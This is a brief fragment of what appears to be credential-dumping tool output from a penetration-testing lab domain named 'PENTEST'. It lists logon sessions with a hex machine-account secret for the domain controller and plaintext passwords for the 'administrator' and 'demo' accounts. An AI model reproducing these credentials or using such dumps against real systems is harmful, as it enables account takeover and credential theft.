0;999      Negotiate  PENTEST       DC$            77 e7 00 bd c7 4e 10 ed 24 6f d0 a6 96 c4 38 0e 1d 11 70 d1 e1 09 1c 83 da 08 a5 fc e8 57 f1 6f 78 66 d8 bf 60 fd fb 18 56 ea 1a f7 06 b8 fa fd 9a d7 1d 61 44 9a ee ea 81 57 73 b7 c2 1d d2 ba 6b bb ec f1 97 f1 26 1b fc 2e e6 a3 21 90 62 7b f1 5b 72 4e c2 43 cc 74 cb 98 f9 7f 74 66 4e 04 fa b1 a4 71 4e 69 50 37 bc 3e 7b 8f 25 75 10 01 8e aa 99 62 72 96 e7 69 66 24 b4 57 a6 ce 49 cb b3 8e a0 fa e7 c2 05 d8 cb b1 55 07 2f 34 6e b9 de ae 4e 5d 98 d2 6f 56 56 0a 8e 6f 99 d2 d0 cf 2c 19 70 d9 2a 49 ba 49 8f 77 bf 15 85 74 a2 98 e4 99 df d4 3d 1c d4 35 c6 3b 0c 84 d7 e8 48 bf 0b 5b 62 b8 e5 0b 42 cd 5b 17 5f d9 13 9c 1e 5e 0c 44 d5 00 83 3b 5f f9 83 66 98 6d 6a e5 15 8f 27 35 82 bc 2e 52 e5 59 a2 17 5c 09 5a a9 56 a0 
0;996      Negotiate  PENTEST       DC$            77 e7 00 bd c7 4e 10 ed 24 6f d0 a6 96 c4 38 0e 1d 11 70 d1 e1 09 1c 83 da 08 a5 fc e8 57 f1 6f 78 66 d8 bf 60 fd fb 18 56 ea 1a f7 06 b8 fa fd 9a d7 1d 61 44 9a ee ea 81 57 73 b7 c2 1d d2 ba 6b bb ec f1 97 f1 26 1b fc 2e e6 a3 21 90 62 7b f1 5b 72 4e c2 43 cc 74 cb 98 f9 7f 74 66 4e 04 fa b1 a4 71 4e 69 50 37 bc 3e 7b 8f 25 75 10 01 8e aa 99 62 72 96 e7 69 66 24 b4 57 a6 ce 49 cb b3 8e a0 fa e7 c2 05 d8 cb b1 55 07 2f 34 6e b9 de ae 4e 5d 98 d2 6f 56 56 0a 8e 6f 99 d2 d0 cf 2c 19 70 d9 2a 49 ba 49 8f 77 bf 15 85 74 a2 98 e4 99 df d4 3d 1c d4 35 c6 3b 0c 84 d7 e8 48 bf 0b 5b 62 b8 e5 0b 42 cd 5b 17 5f d9 13 9c 1e 5e 0c 44 d5 00 83 3b 5f f9 83 66 98 6d 6a e5 15 8f 27 35 82 bc 2e 52 e5 59 a2 17 5c 09 5a a9 56 a0 
0;145416   Kerberos   PENTEST       administrator  This is long Password!@#
0;1278920  Kerberos   PENTEST       demo           pasPAS1234~
0;1278946  Negotiate  PENTEST       demo           pasPAS1234~

```
